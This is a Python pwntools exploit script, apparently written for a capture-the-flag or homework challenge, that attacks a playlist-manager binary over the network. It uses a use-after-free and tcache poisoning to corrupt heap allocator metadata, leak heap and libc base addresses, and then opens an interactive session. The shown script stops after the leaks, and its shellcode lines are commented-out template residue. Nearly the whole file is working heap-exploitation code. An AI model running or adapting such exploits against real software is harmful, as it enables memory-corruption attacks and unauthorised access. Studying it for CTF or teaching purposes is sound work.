#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host homework --port 1337 ./homework
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './homework')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'homework'
port = int(args.PORT or 1337)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(["./ld-linux-x86-64.so.2", "--library-path", ".", exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break _start
'''.format(**locals())

'''
tbreak main
continue
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# FORTIFY:    Enabled
# Stripped:   No
# Debuginfo:  Yes

def register_user(username, password, wait=True): 
    io.recvuntil(b"username: ")
    io.sendline(username)
    io.recvuntil(b"password: ")
    io.sendline(password)
    
def select_option(option, wait=True):
    if wait:
        io.recvuntil(b"Choice: ")
    io.sendline(str(option).encode())
    
def create_playlist(name, desc, wait=True):
    select_option(2, wait=wait) 
    io.recvuntil(b"playlist: ")
    io.sendline(name)
    io.recvuntil(b"description: ")
    io.sendline(desc)

def delete_playlist(wait=True):
    select_option(5, wait=wait)

def print_playlist(wait=True):
    select_option(4, wait=wait)

def debug_print_playlist(wait=True):
    select_option(10, wait=wait)

def edit_playlist(content, editName, wait=True):
    select_option(3, wait=wait)
    io.recvuntil(b"[N]ame/[I]nfo: ")
    if editName:
        edit = b'n'
        io.sendline(edit)
        io.recvuntil(b"name: ")
        io.sendline(content)
    else:
        edit = b'i'
        io.sendline(edit)
        io.recvuntil(b"description: ")
        io.sendline(content)

def create_song(title, album, artist, wait=True):
    select_option(6, wait=wait) 
    io.recvuntil(b"the song: ")
    io.sendline(title)
    io.recvuntil(b"the song: ")
    io.sendline(album)
    io.recvuntil(b"the song: ")
    io.sendline(artist)

def delete_song(id, wait=True):
    select_option(9, wait=wait)
    io.recvuntil(b"delete: ")
    io.sendline(id)

def show_songs(wait=True):
    select_option(8, wait=wait)

def extract_address(addr_text_str):
    match = re.search(b'\[000000\]\s([a-fA-F0-9]+)\s*\n\[0x0008\]', addr_text_str)
    #print(match)
    if not match:
        print("Couldn't extract pie base address")
        exit(1)
    extracted_string = match.group(1)
    return int(extracted_string, 16)

def extract_address2(addr_text_str):
    match = re.search(b'\[0x00f0\]\s([a-fA-F0-9]+)\s*\n\[0x00f8\]', addr_text_str)
    #print(match)
    if not match:
        print("Couldn't extract pie base address")
        exit(1)
    extracted_string = match.group(1)
    return int(extracted_string, 16)

def encode_tcache_address(target, chunk_addr):
    return (chunk_addr >> 12) ^ target

# contig and execution
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64
io = start()

# start up
username = b"user1"
password = b"pass1"
register_user(username, password)

# step 1: leak libc
create_playlist(b"playlist1", b"description1")
create_song(b"song1", b"album1", b"artist1")

# step 2: leak heap
delete_playlist()
debug_print_playlist()
leak = io.recvuntil(b"Choice: ")
heap_addr_enc = extract_address(leak)
heap_base = heap_addr_enc << 12
print(f"Leaked heap: {hex(heap_base)}")

# step 3: write to tcache metadata
fd_and_tcacheKey = p64(0x0) + p64(0x0)
edit_playlist(fd_and_tcacheKey, True, wait=False)
delete_playlist()
tcache_addr = heap_base + 0x10
chunk_addr = heap_base + 0x2a0
fd_and_tcacheKey = p64(encode_tcache_address(tcache_addr, chunk_addr)) + p64(0x0)
edit_playlist(fd_and_tcacheKey, True)
create_playlist(b"AAAAAAAAAAAAAAAA", b"AAAAAAAAAAAAAAAA")
create_playlist(b"", b"")

# step 4: leak libc
# song size is 0x100, playlistsize is 0x130
# index to 0x100 counts bin entry: 14
create_song(b"padding", b"padding", b"padding")
newSize = p16(0x0) * 14 + p16(0x7) + p16(0x0)
edit_playlist(newSize, True)
delete_song(b'0')
newSize = p16(0x0) * 14 + p16(0x1) + p16(0x0)
# index to 0x100 entries bin value: 14
countsOffset = 0x60 * b"\x00"
free_song = heap_base + 0x3d0
newBinEntry = countsOffset + p64(0x0) * 14 + p64(free_song)
edit_playlist(newSize, True)
edit_playlist(newBinEntry, False)
create_song(b"", b"", b"")
debug_print_playlist()
leak = io.recvuntil(b"Choice: ")
libc_addr_enc = extract_address2(leak)
chunk_addr = heap_base + 0x3d0
libc_leak = encode_tcache_address(libc_addr_enc, chunk_addr)
libc_base = libc_leak - 0x1e7c10
print(f"Leaked libc: {hex(libc_base)}")


# extra

delete_playlist(wait=False)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()